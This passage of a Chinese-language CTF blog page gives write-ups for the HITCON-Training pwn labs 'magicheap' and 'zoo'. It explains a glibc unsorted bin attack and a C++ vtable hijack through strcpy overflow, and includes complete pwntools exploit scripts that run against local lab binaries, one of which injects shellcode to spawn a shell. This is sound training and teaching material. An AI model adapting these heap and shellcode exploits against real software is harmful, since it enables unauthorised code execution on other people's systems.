    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="lab14-magicheap">lab14-magicheap</h3>
<p>在 edit_heap() 里有 arbitrary overflow, 我们最终要达到的目的是修改全局变量 magic &gt; 4869, 可以考虑使用 unsorted bin attack 这一技巧
unsorted bin attack 的结果是向任一地址写一个不可控的大数(unsorted bin list 的地址), 看起来比较局限, 但在某些情境下还是很有用的:</p>
<ul>
<li>修改 global_max_fast 为一个较大的数, 这样根据 malloc 的源码</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
</span><span class="cm">   If the size qualifies as a fastbin, first check corresponding bin.
</span><span class="cm">   This code is safe to execute even if av is not yet initialized, so we
</span><span class="cm">   can try it without checking, which saves some time on this fast path.
</span><span class="cm">*/</span>
<span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
 <span class="p">{</span>
   <span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
   <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
   <span class="n">mchunkptr</span> <span class="n">pp</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>
    <span class="p">.....</span>
</code></pre></td></tr></table>
</div>
</div><p>更大的 chunk 也可以被视为 fastbin, fastbin attack 的利用范围就大了很多</p>
<ul>
<li>往某一地址上写值, 比如可以在 __free_hook 前的某一地址上写入一个大数(0x7f**********)来满足 fastbin attack 的条件(提供 fastbin 的 size)</li>
</ul>
<p>unsorted bin attack 的原理也很简单, unsorted bin 的自己实现了 unlink 的功能, 没有使用宏定义</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
          <span class="p">......</span>
          <span class="cm">/* remove from unsorted list */</span>
          <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>

</code></pre></td></tr></table>
</div>
</div><p>可以看出, 如果我们能控制 unsorted bin 的bk 为地址 target - 16, 那么在 bck -&gt; fd = unsorted_chunks(av) 这一步时, target 就会被写入 unsorted bin 的地址. 但同时也要注意此时 unsorted bin list 已经被破坏, 下次再有 unsorted bin 的操作就会引起 crash</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./magicheap&#34;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./magicheap&#34;</span><span class="p">)</span>
<span class="c1">#  libc = ELF(&#34;&#34;)</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">():</span>
    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">attack</span> <span class="o">=</span> <span class="bp">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;aaaa&#39;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
    <span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="s1">&#39;cccc&#39;</span><span class="p">)</span>

    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;magic&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
    <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="n">create</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="s1">&#39;dddd&#39;</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;4869&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><h3 id="lab15-zoo">lab15-zoo</h3>
<p>C++ 的 pwn 题, 这道题目没有开 NX, 也就是说可以使用 shellcode, 在 Dog::Dog, Cat::Cat 这些函数里也有很明显的通过 strcpy 实现 overflow 的漏洞, 因此这一题就可以通过溢出伪造虚表, 控制虚表指针指向 shellcode 地址来 get shell
更多 C++ pwn 的内容可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_others/pwnincplusplus-160217120850.pdf">slide</a>, 内容虽然有点老了, 但很经典</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./zoo&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">addDog</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">weight</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">weight</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./zoo&#34;</span><span class="p">)</span>
    <span class="n">nameofzoo</span> <span class="o">=</span> <span class="mh">0x605420</span>

    <span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">sc</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">nameofzoo</span><span class="p">))</span>

    <span class="n">addDog</span><span class="p">(</span><span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">addDog</span><span class="p">(</span><span class="s1">&#39;1&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">remove</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">vptr</span> <span class="o">=</span> <span class="n">nameofzoo</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
    <span class="n">addDog</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vptr</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span>
    <span class="n">listen</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div>
    </div>

    
    


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://bash-c.github.io/tags/hitcon-training/">HITCON-Training</a>
          <a href="https://bash-c.github.io/tags/pwn/">pwn</a>
          <a href="https://bash-c.github.io/tags/reverse/">reverse</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/hackme.inndy-writeup/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">Hackme.Inndy 的部分 writeup</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
      </nav>
    </footer>
  </article>

  
  

  
  

  

  
  
    <div class="post bg-white">
      <script src="https://utteranc.es/client.js"
            repo= "bash-c/bash-c.github.io"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
      </script>
    </div>
  

  

  

  

    

  

        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:aboultraman@gmail.com" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="https://twitter.com/M4x_1997" rel="me noopener" class="iconfont"
      title="twitter"  target="_blank"
      >
      <svg class="icon" viewBox="0 0 1264 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M1229.8616 18.043658c0 0-117.852626 63.135335-164.151872 67.344358-105.225559-164.151872-505.082682-92.598492-437.738325 223.078185C278.622548 312.675223 89.216542 47.506814 89.216542 47.506814s-117.852626 189.406006 75.762402 345.139833C127.097743 396.85567 55.544363 371.601535 55.544363 371.601535S26.081207 535.753407 253.368414 615.724832c-21.045112 29.463156-113.643603 8.418045-113.643603 8.418045s25.254134 143.10676 231.496229 180.987961c-143.10676 130.479693-387.230056 92.598492-370.393967 105.225559 206.242095 189.406006 1119.599946 231.496229 1128.01799-643.98042C1179.353331 249.539887 1263.533778 123.269217 1263.533778 123.269217s-130.479693 37.881201-138.897738 33.672179C1225.652577 98.015083 1229.8616 18.043658 1229.8616 18.043658"></path>
</svg>

    </a>
  
    <a href="https://github.com/bash-c" rel="me noopener" class="iconfont"
      title="github"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
</svg>

    </a>


<a href="https://bash-c.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
       -
    2021
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        M4x
        
      </span></span>

  
  
    <span id="busuanzi_container">
      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
    </span>
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>












  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  




  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>












</body>
</html>
